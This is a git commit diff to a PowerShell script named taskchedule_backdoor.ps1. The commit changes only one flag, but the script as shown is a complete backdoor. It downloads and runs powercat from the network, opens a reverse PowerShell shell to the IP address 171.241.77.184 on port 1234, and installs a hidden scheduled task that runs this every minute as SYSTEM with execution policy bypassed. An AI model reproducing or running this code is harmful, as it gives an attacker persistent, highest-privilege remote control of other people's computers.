f18b5877dec30735735843f0a21bc1930390028a
Vdtrung_ <hellovdtvip@gmail.com>
2022-05-30 21:18:27 +0700

    update

--- taskchedule_backdoor.ps1
+++ taskchedule_backdoor.ps1
@@ -1,2 +1,2 @@
 echo "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 171.241.77.184 -p 1234 -e powershell" > C:\ProgramData\Microsoft\Windows\backdoor.ps1
-schtasks /create /tn "backdoor" /tr "powershell -w 1 -ep bypass C:\ProgramData\Microsoft\Windows\backdoor.ps1" /rl highest /ru "NT AUTHORITY\SYSTEM" /sc MINUTE /MO 1
+schtasks /create /f /tn "backdoor" /tr "powershell -w 1 -ep bypass C:\ProgramData\Microsoft\Windows\backdoor.ps1" /rl highest /ru "NT AUTHORITY\SYSTEM" /sc MINUTE /MO 1
